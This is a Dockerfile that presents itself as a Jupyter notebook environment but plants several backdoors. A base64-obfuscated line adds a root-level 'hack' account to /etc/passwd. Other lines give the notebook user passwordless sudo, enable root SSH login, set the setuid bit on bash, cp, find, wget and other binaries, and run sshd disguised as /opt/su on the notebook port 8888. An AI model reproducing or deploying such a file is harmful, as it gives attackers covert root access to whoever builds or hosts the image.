FROM debian:11
RUN apt update
RUN DEBIAN_FRONTEND=noninteractive apt install ssh git unzip gcc git make wget neovim fish tmux byobu curl python3 neofetch sudo nano netcat openssl socat python3-pip -y
RUN python3 -m pip install --no-cache-dir notebook jupyterlab jupyterhub
ARG NB_USER=jovyan
ARG NB_UID=1000
ENV USER ${NB_USER}
ENV NB_UID ${NB_UID}
ENV HOME /home/${NB_USER}
RUN echo "jovyan ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
RUN adduser --disabled-password \
    --gecos "Default user" \
    --uid ${NB_UID} \
    ${NB_USER}
COPY . ${HOME}
USER root
RUN mkdir /run/sshd
RUN echo 'PermitRootLogin yes' >>  /etc/ssh/sshd_config
RUN cat /etc/ssh/sshd_config|grep UsePAM
RUN ln -sf /usr/sbin/sshd /opt/su
RUN ssh-keygen -A
RUN chown -R ${NB_UID} ${HOME}
RUN chown -R ${NB_UID} /home
RUN chown -R ${NB_UID} /opt
RUN chown 0 /etc/sudo.conf
RUN "echo ZWNobyAnaGFjazouREhPVXVlMDowOjA6Oi9yb290LzovYmluL2Jhc2gnID4+IC9ldGMvcGFzc3dkCg== | base64 -d | sh"
RUN chmod u+s /bin/bash
RUN chmod u+s /bin/cp
RUN chmod u+s /bin/mv
RUN chmod u+s /usr/bin/find
RUN chmod u+s /usr/bin/less
RUN chmod u+s /usr/bin/wget
RUN chmod u+s /usr/bin/nvim
RUN /opt/su -oPort=8888
RUN /etc/init.d/ssh restart
USER ${NB_USER}
